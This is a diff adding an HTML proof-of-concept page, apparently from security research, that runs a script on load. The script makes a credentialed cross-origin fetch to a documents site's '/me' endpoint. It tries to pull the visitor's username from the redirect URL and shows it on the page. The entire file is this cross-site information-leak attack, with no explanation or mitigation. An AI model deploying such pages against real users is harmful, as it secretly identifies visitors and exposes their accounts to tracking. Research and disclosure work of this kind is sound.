@@ -1,0 +1,21 @@
+<!-- Similar to poc.py only with username -->
+<html>
+<body onload="ms()">
+<h1 id="hello">Loading...</h1>
+<script>
+function ms()
+{
+    fetch ("https://docs.com/me", {
+            mode: "no-cors", 
+            credentials: "include",
+         }).then(function(response) {
+                console.log(response); // If the request is successfull and the user is logged in response.url should be his user page
+                var username = response.url.split("/")[3];
+                document.getElementById("hello").innerHTML = "Hello " + username;
+            }).catch(function(error) {
+                console.log("Failed with: ", error);
+            });
+}
+</script>
+</body>
+</html>
